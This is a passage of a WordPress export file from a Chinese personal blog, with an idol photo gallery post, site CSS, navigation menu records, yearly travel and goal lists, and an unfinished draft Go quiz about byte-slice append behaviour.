alt="29-20151012213905" width="1080" height="1324" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/31-20151012213908.jpg" rel="attachment wp-att-973"><img class="alignnone size-full wp-image-973" src="https://www.nervgeek.com/wp-content/uploads/2016/02/31-20151012213908.jpg" alt="31-20151012213908" width="1080" height="1319" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/32-20151012213908.jpg" rel="attachment wp-att-974"><img class="alignnone size-full wp-image-974" src="https://www.nervgeek.com/wp-content/uploads/2016/02/32-20151012213908.jpg" alt="32-20151012213908" width="1080" height="1324" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/37-20151012213920.jpg" rel="attachment wp-att-975"><img class="alignnone size-full wp-image-975" src="https://www.nervgeek.com/wp-content/uploads/2016/02/37-20151012213920.jpg" alt="37-20151012213920" width="1080" height="1323" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/38-20151012213922.jpg" rel="attachment wp-att-976"><img class="alignnone size-full wp-image-976" src="https://www.nervgeek.com/wp-content/uploads/2016/02/38-20151012213922.jpg" alt="38-20151012213922" width="1080" height="1323" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>966</wp:post_id>
		<wp:post_date><![CDATA[2016-02-20 22:32:30]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-20 14:32:30]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%9d%82%e5%bf%97%e3%80%8abombmagazine%e3%80%8b2015%e5%b9%b45%e6%9c%88%e5%88%8a-%e5%ae%ae%e8%84%87%e5%92%b2%e8%89%af-cut]]></wp:post_name>
		<wp:status><![CDATA[private]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="post_tag" nicename="%e5%85%92%e7%8e%89%e9%81%99"><![CDATA[兒玉遙]]></category>
		<category domain="category" nicename="%e5%86%99%e7%9c%9f"><![CDATA[写真]]></category>
		<category domain="post_tag" nicename="%e5%ae%ae%e8%84%87%e5%92%b2%e8%89%af"><![CDATA[宮脇咲良]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[974]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[891]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>lovecraft</title>
		<link>https://www.nervgeek.com/2017/04/06/lovecraft/</link>
		<pubDate>Thu, 06 Apr 2017 04:50:31 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/mr9esx/lovecraft</guid>
		<description></description>
		<content:encoded><![CDATA[/*
您可以在此处加入您的CSS。
点击上方的帮助图标来了解更多。
*/
#loginform{
	margin: 0;
	margin-top: 35px !important;
}
.login-username input{
	border: 1px solid #ddd;
	padding: 20px 60px 20px 20px;
	font-family: 'Lato', Helvetica, sans-serif;
	font-size: 0.9rem;
}
.login-password input{
	border: 1px solid #ddd;
	padding: 20px 60px 20px 20px;
	font-family: 'Lato', Helvetica, sans-serif;
	font-size: 0.9rem;
}
#wp-submit{
	background-color: #ffffff;
	border: 1px solid #ddd;
	padding: 20px;
	width: 100%;
}
.lost_password-link{
	width: auto !important;
}
.widget-title {
	display: block;
    line-height: 20px !important;
    padding-top: 10px !important;
	margin-bottom: 10px;
}
.widget-content li{
	font-size: 14px;
	border: 0;
	display: inline;
	width: 30%;
	margin-top: 23px;
	float: left;
	text-align: center;
	padding: 0;
}
.avatar_container img{
	width:100px;
}
.anli{
	padding-right: 20px;
}
.call-link{
	margin-bottom: 5px;
}
.call-link>span, .call-link>a{
	padding-left: 10px;
	position: relative;
	top: -2px;
}
.call-link>span{
	color: #18a7db;
}
.register-link{
	text-align: left !important;
}
.lost_password-link{
	text-align: right !important;
	float: right !important;
}
.mejs-video{
	height: 420px !important;
}]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2136</wp:post_id>
		<wp:post_date><![CDATA[2017-04-06 12:50:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2017-04-06 04:50:31]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[lovecraft]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[custom_css]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
														</item>
					<item>
		<title></title>
		<link>https://www.nervgeek.com/2019/04/18/2137/</link>
		<pubDate>Thu, 18 Apr 2019 06:50:58 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/2019/04/18/</guid>
		<description></description>
		<content:encoded><![CDATA[ ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2137</wp:post_id>
		<wp:post_date><![CDATA[2019-04-18 14:50:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-04-18 06:50:58]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[2137]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>8</wp:menu_order>
		<wp:post_type><![CDATA[nav_menu_item]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="nav_menu" nicename="%e8%8f%9c%e5%8d%95"><![CDATA[菜单]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[taxonomy]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_menu_item_parent]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[28]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object]]></wp:meta_key>
		<wp:meta_value><![CDATA[category]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_target]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_classes]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:1:{i:0;s:0:"";}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_xfn]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_url]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title></title>
		<link>https://www.nervgeek.com/2019/04/18/2138/</link>
		<pubDate>Thu, 18 Apr 2019 06:50:58 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/2019/04/18/</guid>
		<description></description>
		<content:encoded><![CDATA[ ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2138</wp:post_id>
		<wp:post_date><![CDATA[2019-04-18 14:50:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-04-18 06:50:58]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[2138]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>7</wp:menu_order>
		<wp:post_type><![CDATA[nav_menu_item]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="nav_menu" nicename="%e8%8f%9c%e5%8d%95"><![CDATA[菜单]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[taxonomy]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_menu_item_parent]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[35]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object]]></wp:meta_key>
		<wp:meta_value><![CDATA[category]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_target]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_classes]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:1:{i:0;s:0:"";}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_xfn]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_url]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>生活</title>
		<link>https://www.nervgeek.com/2019/04/18/%e7%94%9f%e6%b4%bb/</link>
		<pubDate>Thu, 18 Apr 2019 06:50:58 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/2019/04/18/%e7%94%9f%e6%b4%bb/</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2139</wp:post_id>
		<wp:post_date><![CDATA[2019-04-18 14:50:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-04-18 06:50:58]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e7%94%9f%e6%b4%bb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>2</wp:menu_order>
		<wp:post_type><![CDATA[nav_menu_item]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="nav_menu" nicename="%e8%8f%9c%e5%8d%95"><![CDATA[菜单]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[custom]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_menu_item_parent]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[2139]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object]]></wp:meta_key>
		<wp:meta_value><![CDATA[custom]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_target]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_classes]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:1:{i:0;s:0:"";}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_xfn]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_url]]></wp:meta_key>
		<wp:meta_value><![CDATA[http://www.nervgeek.com]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title></title>
		<link>https://www.nervgeek.com/2019/04/18/2140/</link>
		<pubDate>Thu, 18 Apr 2019 06:50:58 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/2019/04/18/</guid>
		<description></description>
		<content:encoded><![CDATA[ ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2140</wp:post_id>
		<wp:post_date><![CDATA[2019-04-18 14:50:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-04-18 06:50:58]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[2140]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>9</wp:menu_order>
		<wp:post_type><![CDATA[nav_menu_item]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="nav_menu" nicename="%e8%8f%9c%e5%8d%95"><![CDATA[菜单]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[post_type]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_menu_item_parent]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[15]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object]]></wp:meta_key>
		<wp:meta_value><![CDATA[page]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_target]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_classes]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:1:{i:0;s:0:"";}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_xfn]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_url]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Travel List</title>
		<link>https://www.nervgeek.com/travel-list/</link>
		<pubDate>Wed, 10 May 2017 16:33:46 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?page_id=2752</guid>
		<description></description>
		<content:encoded><![CDATA[<p style="text-align: center;"><span style="font-size: 24pt;">2015 Travel List</span></p>

<p style="text-align: center;">张家界
厦门
北海
涠洲岛
香港</p>

<hr />

<p style="text-align: center;"><span style="font-size: 24pt;">2016 Travel List</span></p>

<p style="text-align: center;">上海
香港</p>

<hr />

<p style="text-align: center;"><span style="font-size: 24pt;">2017 Travel List</span></p>

<p style="text-align: center;">石家庄
北京
天津
呼和浩特</p>

<hr />

<p style="text-align: center;"><span style="font-size: 24pt;">2018 Travel List</span></p>

<p style="text-align: center;">香港
南宁
钦州
崇左
靖西
凭祥
西安
铜川
延安
银川</p>

<hr />

<p style="text-align: center;"><span style="font-size: 24pt;">2019 Travel List</span></p>

<p style="text-align: center;">长沙
衡山</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2752</wp:post_id>
		<wp:post_date><![CDATA[2017-05-11 00:33:46]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2017-05-10 16:33:46]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[travel-list]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[page]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
														<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_page_template]]></wp:meta_key>
		<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yoast_wpseo_content_score]]></wp:meta_key>
		<wp:meta_value><![CDATA[60]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Dream List</title>
		<link>https://www.nervgeek.com/dream-list/</link>
		<pubDate>Thu, 11 May 2017 06:01:58 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?page_id=2758</guid>
		<description></description>
		<content:encoded><![CDATA[<p style="text-align: center;"><span style="font-size: 24pt;">2017 Dream List</span></p>

<p style="text-align: center;">去看 OOR 亚巡
自己开车上高速
涨薪
减肥
看完618买的书...</p>

<hr />

<p style="text-align: center;"><span style="font-size: 24pt;">2018 Dream List</span></p>

<p style="text-align: center;">摸鱼
涨薪
减肥
学一门新技能</p>

<hr />

<p style="text-align: center;"><span style="font-size: 24pt;">2019 Dream List</span></p>

<p style="text-align: center;">跳出舒适圈
看五场 LiveHouse
扩展交际圈
涨薪</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2758</wp:post_id>
		<wp:post_date><![CDATA[2017-05-11 14:01:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2017-05-11 06:01:58]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[dream-list]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[page]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
														<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_page_template]]></wp:meta_key>
		<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yoast_wpseo_content_score]]></wp:meta_key>
		<wp:meta_value><![CDATA[60]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title></title>
		<link>https://www.nervgeek.com/2019/04/18/4021/</link>
		<pubDate>Thu, 18 Apr 2019 06:50:59 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/2019/04/18/</guid>
		<description></description>
		<content:encoded><![CDATA[ ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4021</wp:post_id>
		<wp:post_date><![CDATA[2019-04-18 14:50:59]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-04-18 06:50:59]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[4021]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>4</wp:menu_order>
		<wp:post_type><![CDATA[nav_menu_item]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="nav_menu" nicename="%e8%8f%9c%e5%8d%95"><![CDATA[菜单]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[post_type]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_menu_item_parent]]></wp:meta_key>
		<wp:meta_value><![CDATA[2139]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[2752]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object]]></wp:meta_key>
		<wp:meta_value><![CDATA[page]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_target]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_classes]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:1:{i:0;s:0:"";}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_xfn]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_url]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title></title>
		<link>https://www.nervgeek.com/2019/04/18/4022/</link>
		<pubDate>Thu, 18 Apr 2019 06:50:59 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/2019/04/18/</guid>
		<description></description>
		<content:encoded><![CDATA[ ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4022</wp:post_id>
		<wp:post_date><![CDATA[2019-04-18 14:50:59]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-04-18 06:50:59]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[4022]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>6</wp:menu_order>
		<wp:post_type><![CDATA[nav_menu_item]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="nav_menu" nicename="%e8%8f%9c%e5%8d%95"><![CDATA[菜单]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[post_type]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_menu_item_parent]]></wp:meta_key>
		<wp:meta_value><![CDATA[2139]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[2758]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_object]]></wp:meta_key>
		<wp:meta_value><![CDATA[page]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_target]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_classes]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:1:{i:0;s:0:"";}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_xfn]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_menu_item_url]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Go 基础面试题 —— []byte 的初始化和 append</title>
		<link>https://www.nervgeek.com/?p=4110</link>
		<pubDate>Mon, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4110</guid>
		<description></description>
		<content:encoded><![CDATA[<h5>请问会输出什么？</h5>

<pre><code class="language-go ">package main

func main() {
    a := []byte("")
    b := []byte{}

    a1 := append(a, '1')
    a2 := append(a, '2')
    b1 := append(b, '1')
    b2 := append(b, '2')

    println(string(a1))
    println(string(a2))
    println(string(b1))
    println(string(b2))
}
</code></pre>

<strong>基础知识点</strong>：<code>slice</code> 的初始化；<code>append</code> 在 <code>len</code> 大于 <code>cap</code> 的时候会创建新的 <code>slice</code> 执行值拷贝操作；

<strong>输出</strong>：

<pre><code class="language-bash ">2
2
1
2
</code></pre>

<strong>原因</strong>：]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4110</wp:post_id>
		<wp:post_date><![CDATA[2019-04-02 16:54:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[0000-00-00 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
